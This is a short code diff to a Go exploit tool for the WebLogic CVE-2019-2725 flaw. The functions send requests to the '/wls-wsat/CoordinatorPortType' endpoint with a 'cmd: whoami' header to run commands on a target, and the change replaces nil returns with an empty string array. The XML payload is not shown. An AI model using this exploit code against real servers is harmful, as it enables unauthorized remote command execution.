@@ -9,8 +9,10 @@ import (
 )
 
 var VUL = "CVE-2019-2725"
+var nullstrarr = []string{"", ""}
 
 func weblogic_10_3_6(ip string) []string {
+
 	url := ip + "/wls-wsat/CoordinatorPortType"
 
 	post_str := `<?xml version="1.0" encoding="utf-8" ?>
@@ -38,18 +40,18 @@ func weblogic_10_3_6(ip string) []string {
 	request.Header.Set("cmd", "whoami")
 	if err != nil {
 		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
-		return nil
+		return nullstrarr
 	}
 	response, err := client.Do(request)
 	if err != nil {
-		return nil
+		return nullstrarr
 	}
 	defer response.Body.Close()
 
 	body, err := ioutil.ReadAll(response.Body)
 	if err != nil {
 		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
-		return nil
+		return nullstrarr
 	}
 
 	status := response.StatusCode
@@ -74,18 +76,18 @@ func weblogic_12_1_3(ip string) []string {
 	request.Header.Set("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")
 	if err != nil {
 		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
-		return nil
+		return nullstrarr
 	}
 	response, err := client.Do(request)
 	if err != nil {
-		return nil
+		return nullstrarr
 	}
 	defer response.Body.Close()
 
 	body, err := ioutil.ReadAll(response.Body)
 	if err != nil {
 		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
-		return nil
+		return nullstrarr
 	}
 
 	status := response.StatusCode
